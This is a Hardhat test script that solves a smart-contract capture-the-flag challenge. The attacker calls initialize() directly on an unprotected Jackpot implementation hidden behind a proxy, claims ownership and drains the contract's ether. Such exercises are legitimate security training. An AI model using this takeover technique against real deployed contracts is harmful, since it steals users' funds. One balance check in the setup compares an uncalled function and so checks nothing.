const { ethers } = require("hardhat");
const { expect } = require("chai");


describe("[Challenge] Trickster", function () {
  let deployer, attacker;

  before(async function () {
    [deployer, attacker] = await ethers.getSigners();

    this.JackpotProxy = await (
      await ethers.getContractFactory("JackpotProxy", deployer)
    ).deploy({ value: ethers.utils.parseUnits("1", 4) });
    await this.JackpotProxy.deployed();

    this.JackpotAddress = await ethers.provider.getStorageAt(
      this.JackpotProxy.address,
      1
    );
    this.JackpotAddress = "0x" + this.JackpotAddress.slice(-40);

    expect(
      (await ethers.provider.getBalance(this.JackpotAddress)).toNumber
    ).to.be.not.eq(0, "You didn't send value!");
  });

  it("Exploit", async function () {
    this.Jackpot = (await ethers.getContractFactory("Jackpot")).attach(
      this.JackpotAddress
    );

    let tx = await this.Jackpot.connect(attacker).initialize(attacker.address);
    await tx.wait();

    let balance = (await ethers.provider.getBalance(this.JackpotAddress))
      .toNumber();

    tx = await this.Jackpot.connect(attacker).claimPrize(balance/2);
    await tx.wait();
  });

  after(async function () {
    expect((await ethers.provider.getBalance(this.JackpotAddress)).toNumber()).to.be.eq(
      0,
      "You didn't take all funds!"
    );
  });
});
